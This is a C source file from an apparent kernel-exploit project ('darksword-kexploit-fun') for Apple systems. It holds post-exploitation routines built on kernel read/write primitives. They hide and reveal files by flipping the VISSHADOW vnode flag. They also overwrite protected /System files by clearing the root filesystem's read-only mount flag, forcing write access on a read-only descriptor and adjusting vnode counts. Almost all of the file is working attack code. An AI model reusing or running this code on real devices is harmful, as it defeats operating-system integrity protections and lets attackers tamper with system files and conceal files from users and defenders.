//
//  file.c
//  darksword-kexploit-fun
//
//  Created by seo on 3/29/26.
//

#include "file.h"
#include "../kexploit/krw.h"
#include "../kexploit/offsets.h"
#include "../kexploit/vnode.h"
#include "../kexploit/kutils.h"
#include "../kexploit/xpaci.h"

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>


uint64_t hide_path(const char* path) {
    uint64_t vnode = get_vnode_for_path_by_open(path);
    if(vnode == -1) {
        printf("[%s:%d] Unable to get vnode, path: %s", __FUNCTION__, __LINE__, path);
        return -1;
    }
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //hide file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags | VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return vnode;
}

uint64_t reveal_path_by_vnode(uint64_t vnode) {
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //show file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags &= ~VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return 0;
}

// Overwrite /System/... file data
uint64_t overwrite_system_file(char* to, char* from) {

    int to_fd = open(to, O_RDONLY);
    if (to_fd == -1) return -1;
    off_t to_file_sz = lseek(to_fd, 0, SEEK_END);
    
    int from_fd = open(from, O_RDONLY);
    if (from_fd == -1) return -1;
    off_t from_file_sz = lseek(from_fd, 0, SEEK_END);
    
    if(to_file_sz < from_file_sz) {
        close(from_fd);
        close(to_fd);
        printf("[%s:%d] File size is too big to overwrite!", __FUNCTION__, __LINE__);
        return -1;
    }
    
    uint64_t proc = proc_self();
    
    // get vnode
    uint64_t fileprocPtrArr = kread64(proc + off_proc_p_fd + off_filedesc_fd_ofiles);
    fileprocPtrArr = xpaci(fileprocPtrArr);
    uint64_t to_fileproc = kread64(fileprocPtrArr + (8 * to_fd));
    uint64_t to_fp_glob = kread64(to_fileproc + off_fileproc_fp_glob);
    to_fp_glob = xpaci(to_fp_glob);
    uint64_t to_vnode = kread64(to_fp_glob + off_fileglob_fg_data);
    to_vnode = xpaci(to_vnode);
    
    // unset read-only flag on rootfs
    uint64_t rootvnode_mount = kread64(get_rootvnode() + off_vnode_v_mount);
    rootvnode_mount = xpaci(rootvnode_mount);
    uint32_t rootvnode_mnt_flag = kread32(rootvnode_mount + off_mount_mnt_flag);
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag & ~MNT_RDONLY);
    
    // modify open flags to make writable
    uint32_t to_fg_flag = kread32(to_fp_glob + off_fileglob_fg_flag);
    kwrite32(to_fp_glob + off_fileglob_fg_flag, to_fg_flag | FWRITE);
    
    // to modify, increasing writecount needed
    uint32_t to_vnode_v_writecount =  kread32(to_vnode + off_vnode_v_writecount);
    if(to_vnode_v_writecount <= 0) {
        kwrite32(to_vnode + off_vnode_v_writecount, to_vnode_v_writecount + 1);
    }
    
    // modify file data
    void* from_mapped = mmap(NULL, from_file_sz, PROT_READ, MAP_PRIVATE, from_fd, 0);
    if (from_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (from_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_fd);
        close(to_fd);
        return -1;
    }
    
    void* to_mapped = mmap(NULL, to_file_sz, PROT_READ | PROT_WRITE, MAP_SHARED, to_fd, 0);
    if (to_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (to_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_fd);
        close(to_fd);
        return -1;
    }

    memcpy(to_mapped, from_mapped, from_file_sz);
    msync(to_mapped, to_file_sz, MS_SYNC);
    
    munmap(from_mapped, from_file_sz);
    munmap(to_mapped, to_file_sz);
    
    // restore open flags
    kwrite32(to_fp_glob + off_fileglob_fg_flag, to_fg_flag);
    // restore rootfs mount flag
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
    
    close(from_fd);
    close(to_fd);
    
    return 0;
}
